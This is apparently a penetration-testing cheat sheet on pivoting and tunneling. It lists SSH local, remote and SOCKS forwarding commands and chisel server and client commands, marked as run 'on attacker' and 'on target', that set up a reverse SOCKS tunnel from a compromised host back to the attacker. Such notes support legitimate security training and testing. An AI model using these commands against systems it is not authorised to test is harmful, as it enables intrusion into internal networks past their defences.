Pivoting & tunneling
++++++++++++++++++++++++++++++++++++++++
# SSH tunnels:
ssh -L 8080:127.0.0.1:80 <user>@<ip_address>      # local forward
ssh -R 9001:127.0.0.1:9001 <user>@<ip_address>    # remote forward (callback)
ssh -D 1080 <user>@<ip_address>                   # dynamic SOCKS (+ proxychains)

# chisel (attacker = server, target = client):
chisel server -p 8000 --reverse                    # on attacker
./chisel client <your-ip>:8000 R:socks             # on target

